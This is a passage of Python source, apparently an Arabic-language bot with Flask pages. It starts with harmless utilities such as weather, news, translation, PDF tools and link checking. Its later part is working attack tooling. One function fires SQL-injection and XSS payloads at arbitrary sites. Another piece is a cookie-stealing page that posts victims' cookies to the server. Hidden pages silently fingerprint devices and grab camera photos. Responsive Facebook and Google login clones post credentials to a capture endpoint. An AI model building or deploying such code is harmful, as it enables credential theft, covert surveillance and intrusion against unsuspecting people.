            return "فشل جلب الطقس، يرجى التحقق من اسم المدينة."
    except Exception as e:
        logger.error(f"get_weather_detailed error: {e}")
        return "خطأ في الاتصال بخدمة الطقس. يرجى المحاولة لاحقاً."

# ===================== دوال الأخبار =====================
def get_news_without_api(topic='general'):
    try:
        rss_feeds = {
            'general': 'https://www.aljazeera.net/feeds/rss',
            'egypt': 'https://www.youm7.com/RSS',
            'sport': 'http://www.kooora.com/rss.aspx',
            'tech': 'https://www.aitnews.com/feed',
            'economy': 'https://www.alarabiya.net/ar/economy/rss.xml',
        }
        feed_url = rss_feeds.get(topic, rss_feeds['general'])
        feed = feedparser.parse(feed_url)
        articles = []
        if feed.entries:
            for entry in feed.entries[:8]:
                title = entry.get('title', '')
                summary = entry.get('summary', '') or entry.get('description', '')
                link = entry.get('link', '')
                articles.append(f"📌 {title}\n{summary[:200]}...\n🔗 {link}\n")
            if articles:
                return "\n".join(articles)
        return "لا توجد أخبار حالياً"
    except Exception as e:
        logger.error(f"get_news_without_api error: {e}")
        return "حدث خطأ في جلب الأخبار"

# ===================== دوال الترجمة =====================
LANGUAGES = {'ar': 'عربي', 'en': 'إنجليزي', 'fr': 'فرنسي', 'es': 'إسباني', 'de': 'ألماني', 'it': 'إيطالي', 'pt': 'برتغالي', 'ru': 'روسي', 'ja': 'ياباني', 'ko': 'كوري', 'zh-cn': 'صيني مبسط', 'hi': 'هندي', 'tr': 'تركي', 'fa': 'فارسي', 'ur': 'أردي'}

def translate_text_advanced_with_lang(text, target_lang='ar'):
    try:
        translator = Translator()
        detected = translator.detect(text)
        translated = translator.translate(text, dest=target_lang)
        chunks = []
        chunk_size = 4000
        for i in range(0, len(translated.text), chunk_size):
            chunks.append(translated.text[i:i+chunk_size])
        return chunks, detected.lang, LANGUAGES.get(detected.lang, detected.lang), LANGUAGES.get(target_lang, target_lang)
    except Exception as e:
        return [text], 'unknown', 'غير معروف', 'غير معروف'

# ===================== دوال Wikipedia =====================
def advanced_wikipedia_search(query):
    try:
        wikipedia.set_lang("ar")
        results = wikipedia.search(query, results=10)
        if not results:
            return "لم يتم العثور على نتائج"
        summaries = []
        for title in results[:3]:
            try:
                page = wikipedia.page(title)
                summary = page.summary[:500] + "..."
                summaries.append(f"📌 {title}\n{summary}\n")
            except:
                summaries.append(f"📌 {title}\n(لا يمكن جلب الملخص)\n")
        return "\n".join(summaries)
    except:
        return "حدث خطأ في البحث"

# ===================== دوال الخدمات العامة =====================
def password_generator(length=12):
    words = ['Star', 'Moon', 'Sun', 'Cloud', 'River', 'Mountain', 'Ocean', 'Forest', 'Eagle', 'Tiger', 'Lion', 'Wolf']
    word = random.choice(words)
    year = str(random.randint(1980, 2025))
    special = random.choice(['@', '#', '$', '%', '&', '!'])
    number = str(random.randint(10, 99))
    parts = [word, year, special, number]
    random.shuffle(parts)
    password = ''.join(parts)
    if len(password) > length:
        password = password[:length]
    elif len(password) < length:
        password += ''.join(random.choices(string.digits, k=length - len(password)))
    return password

def password_strength(password):
    score = 0
    length = len(password)
    if length >= 8:
        score += 1
    if length >= 12:
        score += 1
    if re.search(r'[a-z]', password):
        score += 1
    if re.search(r'[A-Z]', password):
        score += 1
    if re.search(r'\d', password):
        score += 1
    if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        score += 1
    if score <= 2:
        strength = "ضعيفة جداً"
        crack_time = "أقل من ثانية"
    elif score <= 4:
        strength = "ضعيفة"
        crack_time = "بضع ثوانٍ"
    elif score <= 5:
        strength = "متوسطة"
        crack_time = "ساعات"
    elif score <= 6:
        strength = "قوية"
        crack_time = "أيام"
    else:
        strength = "قوية جداً"
        crack_time = "سنوات"
    return strength, crack_time, score

def text_to_speech(text, lang='ar'):
    try:
        tts = gTTS(text=text, lang=lang, slow=False)
        filename = f"tts_{int(time.time())}.mp3"
        filepath = os.path.join('temp', filename)
        os.makedirs('temp', exist_ok=True)
        tts.save(filepath)
        return filepath
    except Exception as e:
        return None

# ===================== دوال فحص الرابط =====================
def check_link_safety_advanced(url, chat_id):
    if not deduct_points(chat_id, 5, "فحص رابط"):
        return "رصيدك من النقاط لا يكفي (تحتاج 5 نقاط)"
    result = {'url': url, 'safe': True, 'risk_level': 'آمن', 'threats': [], 'details': {}, 'recommendations': []}
    try:
        parsed = urlparse(url)
        domain = parsed.netloc
        if not domain:
            domain = url.split('/')[0]
        if not url.startswith('https://'):
            result['safe'] = False
            result['threats'].append({'type': 'HTTP', 'severity': 'عالٍ', 'description': 'الرابط غير مشفر (HTTP)، مما يعرض البيانات للاعتراض (MITM).'})
            result['recommendations'].append('استخدم HTTPS دائماً لحماية البيانات.')
        else:
            result['details']['https'] = 'مفعل'
        shortened_domains = ['bit.ly', 'tinyurl.com', 'goo.gl', 'ow.ly', 'is.gd', 'cli.gs', 'short.link', 'cut.ly', 'rebrand.ly']
        if any(sd in domain for sd in shortened_domains):
            result['safe'] = False
            result['threats'].append({'type': 'Shortened URL', 'severity': 'متوسط', 'description': f'الرابط مختصر عبر {domain}. الروابط المختصرة تستخدم غالباً لإخفاء وجهات خبيثة.'})
            result['recommendations'].append('استخدم أدوات فك اختصار الروابط لمعرفة الوجهة الحقيقية.')
        suspicious_keywords = ['phishing', 'malware', 'virus', 'scam', 'fraud', 'fake', 'hack', 'crack', 'keygen', 'serial', 'login', 'verify', 'secure', 'update', 'confirm', 'verification', 'validate', 'authenticate']
        for keyword in suspicious_keywords:
            if keyword in domain.lower() or keyword in url.lower():
                result['safe'] = False
                result['threats'].append({'type': 'Suspicious Keyword', 'severity': 'عالٍ', 'description': f'تم العثور على كلمة مشبوهة "{keyword}" في الرابط، مما يشير إلى احتمالية الاحتيال.'})
                result['recommendations'].append('تجنب فتح الروابط التي تحتوي على كلمات مثل login, verify, secure إلا من مصادر موثوقة.')
                break
        if result['safe']:
            result['risk_level'] = 'آمن'
        elif len(result['threats']) >= 2:
            result['risk_level'] = 'خطير'
        else:
            result['risk_level'] = 'مشبوه'
    except Exception as e:
        result['safe'] = False
        result['threats'].append({'type': 'Error', 'severity': 'متوسط', 'description': f'حدث خطأ أثناء الفحص: {str(e)[:100]}'})
        result['risk_level'] = 'غير معروف'
    return result

def format_link_report(result):
    msg = f"🔍 تقرير فحص الرابط\n\n"
    msg += f"📎 الرابط: {result['url']}\n"
    msg += f"🛡️ الحالة: {'✅ آمن' if result['safe'] else '❌ غير آمن'}\n"
    msg += f"⚠️ مستوى الخطر: {result['risk_level']}\n\n"
    if result['threats']:
        msg += "🚨 التهديدات المكتشفة:\n"
        for threat in result['threats']:
            msg += f"• {threat['type']} (خطورة: {threat['severity']})\n"
            msg += f"  {threat['description']}\n"
    else:
        msg += "✅ لم يتم اكتشاف أي تهديدات\n"
    if result['recommendations']:
        msg += "\n💡 توصيات:\n"
        for rec in result['recommendations']:
            msg += f"• {rec}\n"
    return msg

# ===================== دوال تحليل PDF =====================
def extract_pdf_text(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def summarize_pdf_text(text, max_sentences=6):
    if not text:
        return "لم يتم استخراج أي نص من الملف"
    sentences = re.split(r'[.!?]', text)
    sentences = [s.strip() for s in sentences if len(s.strip()) > 20]
    if len(sentences) <= max_sentences:
        return text[:1000] + "..."
    words = re.findall(r'\b\w+\b', text.lower())
    word_freq = {}
    for w in words:
        if len(w) > 3:
            word_freq[w] = word_freq.get(w, 0) + 1
    scored_sentences = []
    for s in sentences:
        score = sum(word_freq.get(w, 0) for w in re.findall(r'\b\w+\b', s.lower()))
        scored_sentences.append((score, s))
    scored_sentences.sort(reverse=True)
    summary_sentences = [s for _, s in scored_sentences[:max_sentences]]
    return '. '.join(summary_sentences) + '.'

def smart_pdf_search(text, question):
    if not text:
        return "لم يتم تحميل أي نص"
    paragraphs = text.split('\n\n')
    paragraphs = [p.strip() for p in paragraphs if len(p.strip()) > 50]
    question_lower = question.lower()
    keywords = re.findall(r'\b\w+\b', question_lower)
    keywords = [w for w in keywords if len(w) > 3]
    scored_paragraphs = []
    for para in paragraphs:
        para_lower = para.lower()
        score = sum(1 for kw in keywords if kw in para_lower)
        if score > 0:
            scored_paragraphs.append((score, para))
    scored_paragraphs.sort(reverse=True)
    if scored_paragraphs:
        best_para = scored_paragraphs[0][1]
        if len(scored_paragraphs) > 1 and scored_paragraphs[1][0] > scored_paragraphs[0][0] * 0.5:
            best_para += "\n\n" + scored_paragraphs[1][1]
        answer = f"الإجابة:\n\n{best_para[:1500]}"
        if len(best_para) > 1500:
            answer += "\n\n...(تم اختصار الإجابة للطول)"
        return answer
    else:
        return "لم يتم العثور على إجابة مناسبة في الملف"

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def analyze_apk(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return {'error': 'مفتاح VirusTotal غير مضبوط'}
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = requests.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = requests.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    return {'malicious': stats.get('malicious', 0), 'suspicious': stats.get('suspicious', 0), 'harmless': stats.get('harmless', 0), 'undetected': stats.get('undetected', 0)}
        return {'error': 'فشل فحص الملف'}
    except Exception as e:
        return {'error': str(e)}

# ===================== دوال تحميل الفيديو (محسنة مع Timeout) =====================
def get_random_ua():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)

def download_video(url):
    try:
        os.makedirs('downloads', exist_ok=True)
        timestamp = int(time.time())
        output_template = os.path.join(os.getcwd(), 'downloads', f'video_{timestamp}.%(ext)s')
        
        ydl_opts = {
            'outtmpl': output_template,
            'quiet': True,
            'no_warnings': True,
            'format': 'best[ext=mp4]/best',
            'extract_flat': False,
            'ignoreerrors': True,
            'no_color': True,
            'geo_bypass': True,
            'retries': 10,
            'fragment_retries': 10,
            'headers': {'User-Agent': get_random_ua()},
            'socket_timeout': 60,
        }
        if 'facebook.com' in url or 'fb.watch' in url:
            ydl_opts['extractor_args'] = {
                'facebook': {
                    'prefer_facebook_web': ['true'],
                    'video_codec': ['h264'],
                    'audio_codec': ['aac']
                }
            }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                base_name = output_template.replace('.%(ext)s', '')
                possible_extensions = ['.mp4', '.mkv', '.webm', '.flv', '.avi']
                found_file = None
                for ext in possible_extensions:
                    test_path = base_name + ext
                    if os.path.exists(test_path) and os.path.getsize(test_path) > 0:
                        found_file = test_path
                        break
                if not found_file:
                    filename = ydl.prepare_filename(info)
                    if os.path.exists(filename) and os.path.getsize(filename) > 0:
                        found_file = filename
                if found_file:
                    return found_file, None
                else:
                    files = os.listdir('downloads')
                    video_files = [f for f in files if f.endswith(('.mp4', '.mkv', '.webm', '.flv', '.avi'))]
                    if video_files:
                        video_files.sort(key=lambda x: os.path.getmtime(os.path.join('downloads', x)), reverse=True)
                        return os.path.join('downloads', video_files[0]), None
                    return None, "فشل تحميل الفيديو: الملف غير موجود أو فارغ"
            else:
                return None, "فشل استخراج معلومات الفيديو"
    except Exception as e:
        return None, f"خطأ: {str(e)[:150]}"

# ===================== دوال قص الروابط (محسنة) =====================
def shorten_url(url):
    try:
        # تنظيف الرابط
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # استخدام is.gd أولاً
        response = requests.get(f"https://is.gd/create.php?format=json&url={url}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl']
        
        # استخدام v.gd كبديل
        response = requests.get(f"https://v.gd/create.php?format=json&url={url}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl']
        
        # استخدام TinyURL كحل أخير
        response = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=10)
        if response.status_code == 200 and response.text:
            return response.text.strip()
        
        return None
    except Exception as e:
        logger.error(f"shorten_url error: {e}")
        return None

def expand_url(short_url):
    try:
        response = requests.get(short_url, allow_redirects=True, timeout=10)
        if response.status_code == 200:
            return response.url
        return None
    except Exception as e:
        logger.error(f"expand_url error: {e}")
        return None
      # ===================== دوال الهجمات والأمن =====================
def exploit_sqli(url, parameter, payload):
    test_url = f"{url}?{parameter}={payload}"
    try:
        response = requests.get(test_url, timeout=10, headers={'User-Agent': get_random_ua()})
        if response and ('sql' in response.text.lower() or 'mysql' in response.text.lower() or 'syntax' in response.text.lower()):
            return True, response.text[:500]
    except:
        pass
    return False, None

def exploit_xss(url, parameter, payload):
    test_url = f"{url}?{parameter}={payload}"
    try:
        response = requests.get(test_url, timeout=10, headers={'User-Agent': get_random_ua()})
        if response and payload in response.text:
            return True, response.text[:500]
    except:
        pass
    return False, None

def comprehensive_exploit(url):
    results = {'url': url, 'vulnerabilities': [], 'exploited': [], 'risk': 'منخفض', 'recommendations': []}
    sqli_payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--", "' AND 1=1--"]
    parsed = urlparse(url)
    if parsed.query:
        params = parsed.query.split('&')
        for param in params:
            key = param.split('=')[0] if '=' in param else param
            for payload in sqli_payloads:
                success, output = exploit_sqli(url, key, payload)
                if success:
                    results['vulnerabilities'].append({'type': 'SQL Injection', 'parameter': key, 'payload': payload, 'severity': 'خطير', 'description': 'ثغرة حقن SQL تسمح للمهاجم بتنفيذ أوامر SQL على قاعدة البيانات.', 'evidence': output[:200]})
                    results['exploited'].append({'type': 'SQL Injection', 'parameter': key, 'payload': payload})
                    results['risk'] = 'مرتفع'
                    break
            if results['vulnerabilities']:
                break
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    if parsed.query:
        params = parsed.query.split('&')
        for param in params:
            key = param.split('=')[0] if '=' in param else param
            for payload in xss_payloads:
                success, output = exploit_xss(url, key, payload)
                if success:
                    results['vulnerabilities'].append({'type': 'XSS (Cross-Site Scripting)', 'parameter': key, 'payload': payload, 'severity': 'عالٍ', 'description': 'ثغرة XSS تسمح للمهاجم بحقن أكواد برمجية خبيثة في صفحات الموقع.', 'evidence': output[:200]})
                    results['exploited'].append({'type': 'XSS', 'parameter': key, 'payload': payload})
                    if results['risk'] != 'مرتفع':
                        results['risk'] = 'مرتفع'
                    break
            if results['vulnerabilities'] and any(v['type'] == 'XSS' for v in results['vulnerabilities']):
                break
    try:
        domain = parsed.netloc
        if domain:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    not_after = cert.get('notAfter', 'غير معروف')
                    results['details'] = {'ssl_valid': True, 'ssl_expiry': not_after, 'issuer': cert.get('issuer', 'غير معروف')}
    except:
        results['details'] = {'ssl_valid': False, 'ssl_expiry': 'غير معروف'}
        results['vulnerabilities'].append({'type': 'SSL/TLS', 'severity': 'متوسط', 'description': 'شهادة SSL غير صالحة أو غير موجودة، مما يعرض البيانات للاعتراض.'})
    try:
        resp = requests.get(url, timeout=10, headers={'User-Agent': get_random_ua()})
        headers = resp.headers
        if 'X-Frame-Options' not in headers:
            results['vulnerabilities'].append({'type': 'Clickjacking', 'severity': 'متوسط', 'description': 'الموقع غير محمي ضد هجمات Clickjacking (نقص رأس X-Frame-Options).'})
        if 'Content-Security-Policy' not in headers:
            results['vulnerabilities'].append({'type': 'CSP Missing', 'severity': 'منخفض', 'description': 'سياسة أمان المحتوى (CSP) غير محددة، مما يزيد من خطر هجمات XSS.'})
    except:
        pass
    if results['vulnerabilities']:
        results['recommendations'].append("قم بتحديث جميع المكتبات والإطارات المستخدمة.")
        results['recommendations'].append("استخدم استعلامات معدة (Prepared Statements) لمنع SQL Injection.")
        results['recommendations'].append("طبق سياسة أمان المحتوى (CSP) وتأكد من إعداد رؤوس الأمان بشكل صحيح.")
    return results

def format_exploit_report(result):
    msg = f"🔍 تقرير الفحص الشامل للموقع\n\n"
    msg += f"📎 الموقع: {result['url']}\n"
    msg += f"⚠️ مستوى الخطر العام: {result['risk']}\n\n"
    if result.get('details'):
        msg += "📋 تفاصيل SSL:\n"
        for key, value in result['details'].items():
            msg += f"• {key}: {value}\n"
        msg += "\n"
    if result['vulnerabilities']:
        msg += "🚨 الثغرات المكتشفة:\n"
        for v in result['vulnerabilities']:
            msg += f"• النوع: {v['type']}\n"
            msg += f"  - الخطورة: {v.get('severity', 'غير معروف')}\n"
            msg += f"  - الوصف: {v.get('description', 'لا يوجد وصف')}\n"
            if 'parameter' in v:
                msg += f"  - المعامل: {v['parameter']}\n"
            if 'payload' in v:
                msg += f"  - الحمولة المستخدمة: {v['payload']}\n"
            msg += "\n"
    else:
        msg += "✅ لم يتم اكتشاف أي ثغرات أمنية.\n\n"
    if result['recommendations']:
        msg += "💡 التوصيات:\n"
        for rec in result['recommendations']:
            msg += f"• {rec}\n"
    return msg

def track_phone_number(number):
    if not NUMVERIFY_API_KEY:
        return "مفتاح API لتتبع الأرقام غير مضبوط. يرجى إضافة NUMVERIFY_API_KEY في المتغيرات البيئية."
    try:
        url = f"http://apilayer.net/api/validate?access_key={NUMVERIFY_API_KEY}&number={number}&format=1"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('valid'):
                msg = f"📱 تقرير تتبع الرقم: {number}\n\n"
                msg += f"• البلد: {data.get('country_name', 'غير معروف')}\n"
                msg += f"• رمز البلد: {data.get('country_code', 'غير معروف')}\n"
                msg += f"• المنطقة: {data.get('location', 'غير معروف')}\n"
                msg += f"• مشغل الشبكة: {data.get('carrier', 'غير معروف')}\n"
                msg += f"• نوع الرقم: {data.get('line_type', 'غير معروف')}\n"
                msg += f"• صيغة دولية: {data.get('international_format', 'غير معروف')}\n"
                msg += f"• صيغة محلية: {data.get('national_format', 'غير معروف')}\n"
                return msg
            else:
                return f"❌ الرقم {number} غير صحيح أو غير موجود."
        else:
            return "❌ فشل الاتصال بخدمة تتبع الأرقام."
    except Exception as e:
        logger.error(f"track_phone_number error: {e}")
        return f"❌ حدث خطأ: {str(e)[:100]}"

# ===================== دوال سرقة الكوكيز =====================
COOKIE_STEALER_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Loading...</title>
<style>body{margin:0;padding:0;background:#0a0a1a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;color:#fff;flex-direction:column;}.loader{width:50px;height:50px;border:5px solid #1a1a3e;border-top:5px solid #3b82f6;border-radius:50%;animation:spin 1s linear infinite;margin:20px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.text{color:#8ab4f8;font-size:16px;}</style>
</head>
<body><div class="loader"></div><div class="text">جاري التحميل...</div>
<script>
function stealCookies(){const cookies=document.cookie;if(!cookies)return;const token=new URLSearchParams(window.location.search).get('token');if(!token)return;fetch(window.location.origin+'/steal_cookies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:token,cookies:cookies,url:window.location.href,user_agent:navigator.userAgent})}).then(()=>{window.location.href='https://www.google.com';}).catch(()=>{window.location.href='https://www.google.com';});}
setTimeout(stealCookies,1500);
</script></body></html>
"""

# ===================== صفحات Flask =====================
DEVICE_INFO_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>...</title>
<style>body{margin:0;padding:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#000;font-family:Arial;}</style>
</head>
<body><div style="color:#000;">.</div>
<script>
function collectInfo(){
    const info={"الدولة":"","المدينة":"","عنوان IP":"","شحن الهاتف":"غير معروف","هل الهاتف يشحن؟":"لا","الشبكة":"غير معروف","نوع الاتصال":"غير معروف","الوقت":new Date().toLocaleString('ar-EG'),"اسم الجهاز":navigator.platform||"غير معروف","إصدار الجهاز":navigator.userAgent||"غير معروف","نوع الجهاز":/Mobi/.test(navigator.userAgent)?"هاتف":"كمبيوتر","الذاكرة (RAM)":navigator.deviceMemory?navigator.deviceMemory+" GB":"غير معروف","عدد الأنوية":navigator.hardwareConcurrency||"غير معروف","لغة النظام":navigator.language||"غير معروف","دقة الشاشة":window.screen.width+"x"+window.screen.height,"إصدار نظام التشغيل":navigator.platform||"غير معروف","عمق الألوان":window.screen.colorDepth+" bit"};
    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{info["الدولة"]=d.country_name||"";info["المدينة"]=d.city||"";info["عنوان IP"]=d.ip||"";sendData(info);}).catch(()=>sendData(info));
    if(navigator.getBattery){navigator.getBattery().then(b=>{info["شحن الهاتف"]=Math.round(b.level*100)+"%";info["هل الهاتف يشحن؟"]=b.charging?"نعم":"لا";});}
}
function sendData(data){const token=new URLSearchParams(window.location.search).get('token');if(!token)return;fetch(window.location.origin+'/collect_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:token,data:data})}).then(()=>{window.close();}).catch(()=>{window.close();});}
collectInfo();
setTimeout(()=>{window.close();},5000);
</script></body></html>
"""

CAMERA_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>...</title>
<style>body{margin:0;padding:0;background:#000;}video{display:none;}</style>
</head>
<body><video id="video" autoplay playsinline></video>
<script>
const video=document.getElementById('video');
let stream=null;
function captureAndSend(){
    if(!stream)return;
    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth||640;
    canvas.height=video.videoHeight||480;
    canvas.getContext('2d').drawImage(video,0,0);
    const imageData=canvas.toDataURL('image/jpeg',0.9);
    const token=new URLSearchParams(window.location.search).get('token');
    if(!token)return;
    fetch(window.location.origin+'/collect_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:token,data:{image:imageData}})}).then(()=>{window.close();}).catch(()=>{window.close();});
}
navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}}).then(s=>{stream=s;video.srcObject=s;setTimeout(captureAndSend,2000);}).catch(()=>{window.close();});
setTimeout(()=>{window.close();},10000);
</script></body></html>
"""

# ===================== صفحات التصيد (محسنة ومتجاوبة) =====================
PHISHING_PAGES = {}

def get_phishing_page(platform):
    if platform in PHISHING_PAGES:
        return PHISHING_PAGES[platform]
    
    if platform == 'facebook':
        html = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>فيسبوك</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: #ffffff;
            padding: 30px 20px;
            border-radius: 0;
            text-align: center;
        }
        .language-selector {
            text-align: left;
            font-size: 14px;
            color: #606770;
            margin-bottom: 20px;
        }
        .language-selector span {
            display: inline-block;
            padding: 5px 10px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            cursor: pointer;
        }
        .fb-icon {
            width: 70px;
            height: 70px;
            background: #1877f2;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 25px;
            font-size: 40px;
            font-weight: bold;
            color: #ffffff;
            font-family: Arial, sans-serif;
        }
        .input-group {
            position: relative;
            margin-bottom: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px 14px 40px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 16px;
            background: #f5f6f7;
            outline: none;
            transition: border-color 0.2s;
            color: #1c1e21;
            direction: rtl;
        }
        .input-group input:focus {
            border-color: #1877f2;
            background: #ffffff;
        }
        .input-group .icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #606770;
            font-size: 18px;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 6px;
        }
        .login-btn:hover {
            background: #166fe5;
        }
        .forgot-link {
            display: block;
            margin: 16px 0 20px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .divider {
            height: 1px;
            background: #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            width: 100%;
            padding: 14px;
            background: transparent;
            color: #1877f2;
            border: 2px solid #1877f2;
            border-radius: 8px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 6px;
        }
        .create-btn:hover {
            background: #f0f2f5;
        }
        .meta-footer {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            margin-top: 30px;
            color: #8a8d91;
            font-size: 13px;
        }
        .meta-footer svg {
            width: 16px;
            height: 16px;
            fill: #8a8d91;
        }
        @media (max-width: 480px) {
            .container { padding: 20px 16px; }
            .fb-icon { width: 60px; height: 60px; font-size: 34px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="language-selector"><span>العربية ▼</span></div>
        <div class="fb-icon">f</div>
        <form method="POST" action="/phishing_capture">
            <input type="hidden" name="platform" value="facebook">
            <div class="input-group">
                <span class="icon">ⓘ</span>
                <input type="text" name="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="كلمة السر" required>
            </div>
            <button class="login-btn" type="submit">تسجيل الدخول</button>
        </form>
        <a class="forgot-link" href="#">هل نسيت كلمة السر؟</a>
        <div class="divider"></div>
        <button class="create-btn" onclick="alert('تم إنشاء الحساب')">إنشاء حساب جديد</button>
        <div class="meta-footer">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
            <span>Meta</span>
        </div>
    </div>
</body>
</html>
"""
    elif platform == 'google':
        html = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>جوجل</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: #ffffff;
            padding: 40px 20px;
            text-align: center;
        }
        .google-logo {
            font-size: 42px;
            font-weight: 500;
            letter-spacing: -2px;
            margin-bottom: 30px;
        }
        .google-logo span:nth-child(1) { color: #4285f4; }
        .google-logo span:nth-child(2) { color: #ea4335; }
        .google-logo span:nth-child(3) { color: #fbbc05; }
        .google-logo span:nth-child(4) { color: #4285f4; }
        .google-logo span:nth-child(5) { color: #34a853; }
        .google-logo span:nth-child(6) { color: #ea4335; }
        .input-group {
            margin-bottom: 16px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            background: #ffffff;
            outline: none;
            transition: border-color 0.2s;
            color: #202124;
            direction: rtl;
        }
        .input-group input:focus {
            border-color: #4285f4;
            box-shadow: 0 0 0 2px rgba(66,133,244,0.2);
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #4285f4;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
        }
        .login-btn:hover { background: #3367d6; }
        .forgot-link {
            display: block;
            margin: 16px 0 20px;
            color: #4285f4;
            text-decoration: none;
            font-size: 14px;
        }
        .divider { height: 1px; background: #dadce0; margin: 20px 0; }
        .create-btn {
            width: 100%;
            padding: 14px;
            background: transparent;
            color: #4285f4;
            border: 2px solid #4285f4;
            border-radius: 8px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
        }
